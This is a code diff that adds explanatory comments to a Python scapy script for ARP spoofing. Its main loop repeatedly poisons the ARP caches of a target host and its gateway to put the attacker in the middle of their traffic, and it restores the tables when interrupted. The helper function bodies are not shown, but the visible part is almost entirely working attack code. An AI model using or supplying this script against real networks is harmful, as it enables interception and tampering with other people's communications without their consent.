@@ -5,7 +5,7 @@ import scapy.all as scapy
 import time
 import subprocess
 
-
+# Get the mac address of the specified ip
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -35,13 +35,17 @@ source_mac = get_mac(gateway_ip)
 try:
     sent_packets_count = 0
     while True:
+        # Spoof the target
         spoof(target_ip, gateway_ip, target_mac)
+        # Spoof the gateway
         spoof(gateway_ip, target_ip, gateway_mac)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        # sleep for 3 sec before spoofing again
         time.sleep(3)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ..... Resetting ARP tables ..... Please Wait\n")
+    # Restore the original values
     restore(target_ip, gateway_ip,destination_mac,source_mac)
     restore(gateway_ip, target_ip,source_mac,destination_mac)
 
